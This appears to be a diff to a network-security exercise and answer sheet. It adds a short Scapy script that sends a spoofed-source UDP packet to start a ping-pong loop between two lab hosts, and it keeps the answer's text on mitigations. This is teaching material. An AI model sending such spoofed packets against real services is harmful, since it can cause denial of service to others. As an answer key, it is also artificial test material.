@@ -220,7 +220,22 @@ Bob runs it on:
 1. Write a simple Python program to trigger a UDP ping-pong loop between them.
 2. Explain how the program could be modified to prevent this vulnerability.
 
-**Answer**: Modify the program so it does not blindly reply to every UDP packet, by validating sources, ignoring broadcasts, and applying rate limits to prevent amplification attacks.
+**Answer**:
+```python
+#!/bin/env python3
+
+from scapy.all import *
+
+ip   = IP(src="10.8.0.8", dst="192.168.0.7")
+udp  = UDP(sport=8000, dport=7000)
+data = "Burn Baby Burn!\n"
+
+pkt = ip/udp/data
+pkt.show()
+send(pkt, verbose=0)
+```
+
+ Modify the program so it does not blindly reply to every UDP packet, by validating sources, ignoring broadcasts, and applying rate limits to prevent amplification attacks.
 
 ### Problem 5
 UDP services are commonly used in amplification attacks. Why is TCP generally not suitable for amplification attacks?
